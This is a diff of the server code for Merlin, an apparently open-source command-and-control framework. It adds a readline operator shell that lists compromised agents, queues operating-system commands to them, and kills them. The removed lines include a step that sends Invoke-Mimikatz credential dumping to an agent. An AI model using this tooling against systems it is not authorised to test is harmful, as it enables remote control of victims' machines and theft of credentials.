@@ -1,45 +1,48 @@
 package main
 
 import (
-	"bufio"
+	//Standard
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	//"log"
 	"net/http"
 	"os"
 	"time"
-	"github.com/ne0nd0g/merlin/pkg"
-	"github.com/ne0nd0g/merlin/pkg/banner"
-	"github.com/ne0nd0g/merlin/pkg/messages"
+	"flag"
+	"math/rand"
+	"strings"
+	"path/filepath"
+	"strconv"
+	"log"
+	"io"
+	"encoding/base64"
+
+	//3rd Party
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"github.com/olekukonko/tablewriter"
-	"flag"
-	"math/rand"
-	//"github.com/mattn/go-sqlite3"
-	//"database/sql"
-	"encoding/base64"
-	"strings"
-	"path/filepath"
-	//"crypto/x509"
-	//"text/template/parse"
-	"strconv"
-	"io/ioutil"
+	"github.com/chzyer/readline"
+
+	//Merlin
+	"github.com/ne0nd0g/merlin/pkg"
+	"github.com/ne0nd0g/merlin/pkg/banner"
+	"github.com/ne0nd0g/merlin/pkg/messages"
 )
 
 //Global Variables
 var DEBUG = false
 var VERBOSE = false
 var src = rand.NewSource(time.Now().UnixNano())
-const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+var currentDir, _ = os.Getwd()
+var agents = make(map[uuid.UUID]*agent) //global map to house agent objects
+
+//Constants
 const (
     letterIdxBits = 6                    // 6 bits to represent a letter index
     letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
     letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
+    letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 )
-var currentDir, _ = os.Getwd()
-var agents = make(map[uuid.UUID]*agent) //global map to house agent objects
 
 func main() {
 
@@ -53,11 +56,6 @@ func main() {
 
 	color.Blue(banner.Banner1)
 	color.Blue("\t\t   Version: %s", merlin.Version)
-
-	//Database Connection
-	//db, _ := sql.Open("sqlite3", string(currentDir) + "/data/db/foo.db")
-
-	//time.Sleep(300 * time.Millisecond)
 
 	go startListener(strconv.Itoa(*port), *ip, *crt, *key, "/")
 	shell ()
@@ -126,11 +124,9 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 					p.Stderr))
 				color.Red("%s", p.Stderr)
 			}
-			fmt.Printf("merlin>")
 
 		default:
 			color.Red("[!]Invalid Activity: %s", j.Type)
-			fmt.Printf("merlin>")
 		}
 
 	} else if r.Method == "GET" {
@@ -147,12 +143,12 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 
 func startListener(port string, ip string, crt string, key string, webpath string) {
 
+	time.Sleep(45 * time.Millisecond) //Sleep to allow the shell to start up
 	//Check to make sure files exist
 	_, err_crt := os.Stat(crt)
 	if err_crt != nil {
 		color.Red("[!]There was an error importing the SSL/TLS x509 certificate")
 		fmt.Println(err_crt)
-		fmt.Printf("merlin>")
 		return
 	}
 
@@ -160,7 +156,6 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 	if err_key != nil {
 		color.Red("[!]There was an error importing the SSL/TLS x509 key")
 		fmt.Println(err_key)
-		fmt.Printf("merlin>")
 		return
 	}
 
@@ -170,7 +165,6 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 		color.Red("[!]There was an error importing the SSL/TLS x509 key pair")
 		color.Red("[!]Ensure a keypair is located in the data/x509 directory")
 		fmt.Println(err)
-		fmt.Printf("merlin>")
 		return
 	}
 
@@ -199,12 +193,10 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 
 	//I shouldn't need to specify the certs as they are in the config
 	color.Yellow("[-]HTTPS Listener Started on %s:%s", ip, port)
-	fmt.Printf("merlin>")
 	err2 := s.ListenAndServeTLS(crt, key)
 	if err2 != nil {
 		color.Red("[!]There was an error with the web server")
 		fmt.Println(err2)
-		fmt.Printf("merlin>")
 		return
 	}
 	// TODO determine scripts path and load certs by their absolute path
@@ -252,7 +244,6 @@ func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), p.Pid))
 
-	fmt.Printf("merlin>")
 	//Add code here to create db record
 }
 
@@ -272,20 +263,18 @@ func statusCheckIn(j messages.Base) messages.Base {
 		jobID := RandStringBytesMaskImprSrc(10)
 		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)
 
-		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n",time.Now(), command[0]))
-		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n",time.Now(), command[1:]))
+		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n",time.Now(), command[1]))
+		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n",time.Now(), command[3:]))
 		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Created job %s for agent %s\r\n",time.Now(), jobID, j.ID))
 
-		fmt.Printf("merlin>")
-
-		switch command[0]{
-		case "agent_cmd":
+		switch command[1]{
+		case "cmd":
 			p := messages.CmdPayload{
-			Command: command[2],
+			Command: command[3],
 			Job: jobID,
 			}
-			if len(command) > 3 {
-				p.Args = strings.Join(command[3:], " ")
+			if len(command) > 4 {
+				p.Args = strings.Join(command[4:], " ")
 			}
 
 			k, err := json.Marshal(p)
@@ -304,9 +293,24 @@ func statusCheckIn(j messages.Base) messages.Base {
 
 			return g
 
-		case "agent_control":
+		case "control":
 			p := messages.AgentControl{
 			Command: command[2],
+			Job: jobID,
+			}
+
+			k, _ := json.Marshal(p)
+			g := messages.Base{
+				Version: 1.0,
+				ID:      j.ID,
+				Type:    "AgentControl",
+				Payload: (*json.RawMessage)(&k),
+			}
+
+			return g
+		case "kill":
+			p := messages.AgentControl{
+			Command: command[1],
 			Job: jobID,
 			}
 
@@ -345,11 +349,11 @@ func usage () {
 	table.SetHeader([]string{"Command", "Arguments", "Options", "Description"})
 
 	data := [][]string{
-		[]string{"agent_cmd", "<agent ID> <command>", "", "Run a command on target's operating system"},
-		[]string{"agent_control", "<agent ID> <command>", "kill", "Control messages & " +
+		[]string{"agent cmd", "<agent ID> <command>", "", "Run a command on target's operating system"},
+		[]string{"agent control", "<agent ID> <command>", "kill", "Control messages & " +
 			"functions to the agent itself"},
-		[]string{"agent_info", "<agent ID>", "", "Display all information about an agent"},
-		[]string{"agent_list", "None", "", "List all checked In agents"},
+		[]string{"agent info", "<agent ID>", "", "Display all information about an agent"},
+		[]string{"agent list", "None", "", "List all checked In agents"},
 		[]string{"exit", "None", "", "Exit the Merlin server"},
 		[]string{"quit", "None", "", "Exit the Merlin server"},
 	}
@@ -360,111 +364,160 @@ func usage () {
 	fmt.Println()
 }
 
+func filterInput(r rune) (rune, bool) {
+	switch r {
+	// block CtrlZ feature
+	case readline.CharCtrlZ:
+		return r, false
+	}
+	return r, true
+}
+
+func getAgentList() func(string) []string {
+	return func(line string) []string {
+		a := make([]string, 0)
+		for k := range agents {
+			a = append(a, k.String())
+		}
+		return a
+	}
+}
+
 func shell() {
-	reader := bufio.NewReader(os.Stdin)
+
+	var agentCompleter = readline.PcItemDynamic(getAgentList())
+	var completer = readline.NewPrefixCompleter(
+		readline.PcItem("agent",
+			readline.PcItem("list"),
+			readline.PcItem("info",
+				agentCompleter,
+			),
+			readline.PcItem("cmd",
+				agentCompleter,
+			),
+			readline.PcItem("control",
+				agentCompleter,
+			),
+			readline.PcItem("kill",
+				agentCompleter,
+			),
+		),
+		readline.PcItem("exit"),
+		readline.PcItem("quit"),
+		readline.PcItem("help"),
+	)
+
+	ms, err := readline.NewEx(&readline.Config{
+		Prompt:          "\033[31mMerlin»\033[0m ",
+		HistoryFile:     "/tmp/readline.tmp",
+		AutoComplete:    completer,
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
+		HistorySearchFold:   true,
+		FuncFilterInputRune: filterInput,
+	})
+
+	if err != nil {
+		panic(err)
+	}
+	defer ms.Close()
+
+	log.SetOutput(ms.Stderr())
 
 	for {
-		fmt.Printf("merlin>")
-		input_cmd, _ := reader.ReadString('\n')
-		stripped_cmd := strings.TrimRight(input_cmd, "\r\n")
-		cmd := strings.Split(stripped_cmd, " ")
-
-		switch cmd[0] {
-		case "":
-		case "module":
-			//f, err :=ioutil.ReadFile("C:\\Users\\Russe\\Desktop\\hw.ps1")
-			f, err :=ioutil.ReadFile("C:\\Data\\Dev\\Ne0nd0g\\Merlin\\data\\src\\PowerShell\\PowerSploit\\Exfiltration\\Invoke-Mimikatz.ps1")
-			if err != nil {
-				color.Red("There was an error reading the file")
-				color.Red(err.Error())
+		line, err := ms.Readline()
+		if err == readline.ErrInterrupt {
+			if len(line) == 0 {
+				break
+			} else {
+				continue
 			}
+		} else if err == io.EOF {
+			break
+		}
 
-			a, _ := uuid.FromString(cmd[1])
-			cmd[0] = "agent_cmd"
-			cmd = append(cmd, "test")
-			t := "($s=" + string(f) + ");Invoke-Mimikatz -DumpCreds"
-			cmd[2] = t
-			s := agents[a].channel
-			s <- cmd
+		line = strings.TrimSpace(line)
+		cmd := strings.Split(line, " ")
 
-		case "exit":
-			color.Red("[!]Quitting")
-			os.Exit(0)
-
-		case "quit":
-			color.Red("[!]Quitting")
-			os.Exit(0)
-
-		case "?":
-			usage()
-
-		case "help":
-			usage()
-
-		case "agent_control":
-			if len(cmd) == 3 {
-				a, _ := uuid.FromString(cmd[1])
-				s := agents[a].channel //https://github.com/golang/go/issues/3117
-				s <- cmd
-			}else {
-				color.Red("[!]Invalid command")
-				color.White("agent_control <agent ID> <command>")
-			}
-
-		case "agent_cmd":
-			if len(cmd) >= 3 {
-				a, _ := uuid.FromString(cmd[1])
-				s := agents[a].channel //https://github.com/golang/go/issues/3117
-				s <- cmd
-				a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[2]))
-				if DEBUG {
-					color.Red("[DEBUG]Input: %s", cmd[2])
-					color.Red("[DEBUG]Base64 Input: %s", a_cmd)
-				}
-			}else {
-				color.Red("[!]Invalid command")
-				color.White("agent_cmd <agent ID> <cmd>")
-			}
-
-		case "agent_list":
-			table := tablewriter.NewWriter(os.Stdout)
-			table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
-			table.SetAlignment(tablewriter.ALIGN_CENTER)
-
-			for k, v := range agents {
-    				table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
-					v.hostName, "HTTP/2"})
-			}
-			fmt.Println()
-			table.Render()
-			fmt.Println()
-		case "agent_info":
-			if len(cmd) == 1 {
-				color.Red("[!]Invalid command")
-				color.White("agent_info <agent_id>")
-			} else if len(cmd) >= 2 {
-				a, _ := uuid.FromString(cmd[1])
+		switch cmd[0]{
+		case "agent":
+			switch cmd[1] {
+			case "list":
 				table := tablewriter.NewWriter(os.Stdout)
-				table.SetAlignment(tablewriter.ALIGN_LEFT)
-				data := [][]string{
-					[]string{"ID", agents[a].id.String()},
-					[]string{"Platform", agents[a].platform},
-					[]string{"Architecture", agents[a].architecture},
-					[]string{"UserName", agents[a].userName},
-					[]string{"User GUID", agents[a].userGUID},
-					[]string{"Hostname", agents[a].hostName},
-					[]string{"Process ID", strconv.Itoa(agents[a].pid)},
-					[]string{"Inital Check In", agents[a].iCheckIn.String()},
-					[]string{"Last Check In", agents[a].sCheckIn.String()},
+				table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
+				table.SetAlignment(tablewriter.ALIGN_CENTER)
+				for k, v := range agents {
+    					table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
+								v.hostName, "HTTP/2"})
 				}
-				table.AppendBulk(data)
 				fmt.Println()
 				table.Render()
 				fmt.Println()
+			case "info":
+				if len(cmd) == 2 {
+				color.Red("[!]Invalid command")
+				color.White("agent info <agent_id>")
+				} else if len(cmd) >= 3 {
+					a, _ := uuid.FromString(cmd[2])
+					table := tablewriter.NewWriter(os.Stdout)
+					table.SetAlignment(tablewriter.ALIGN_LEFT)
+					data := [][]string{
+						[]string{"ID", agents[a].id.String()},
+						[]string{"Platform", agents[a].platform},
+						[]string{"Architecture", agents[a].architecture},
+						[]string{"UserName", agents[a].userName},
+						[]string{"User GUID", agents[a].userGUID},
+						[]string{"Hostname", agents[a].hostName},
+						[]string{"Process ID", strconv.Itoa(agents[a].pid)},
+						[]string{"Inital Check In", agents[a].iCheckIn.String()},
+						[]string{"Last Check In", agents[a].sCheckIn.String()},
+					}
+					table.AppendBulk(data)
+					fmt.Println()
+					table.Render()
+					fmt.Println()
+				}
+			case "cmd":
+				if len(cmd) >= 4 {
+					a, _ := uuid.FromString(cmd[2])
+					s := agents[a].channel //https://github.com/golang/go/issues/3117
+					s <- cmd
+					a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[3]))
+					if DEBUG {
+						color.Red("[DEBUG]Input: %s", cmd[3])
+						color.Red("[DEBUG]Base64 Input: %s", a_cmd)
+					}
+				}else {
+					color.Red("[!]Invalid command")
+					color.White("agent cmd <agent ID> <cmd>")
+				}
+			case "kill":
+				if len(cmd) == 3 {
+					a, _ := uuid.FromString(cmd[2])
+					s := agents[a].channel //https://github.com/golang/go/issues/3117
+					s <- cmd
+				}else {
+					color.Red("[!]Invalid command")
+					color.White("agent kill <agent ID>")
+				}
+			case "control":
+				color.Red("[!]Agent control not implemented yet")
+			default:
+				println("invalid agent command:", line[5:])
 			}
-
+		case "help":
+			usage()
+		case "?":
+			usage()
+		case "exit":
+			color.Red("[!]Quitting")
+			os.Exit(0)
+		case "quit":
+			color.Red("[!]Quitting")
+			os.Exit(0)
+		case "":
 		default:
-			color.Red("[!]Invalid command: %s", cmd)
+			log.Println("you said:", strconv.Quote(line))
 		}
 	}
 }
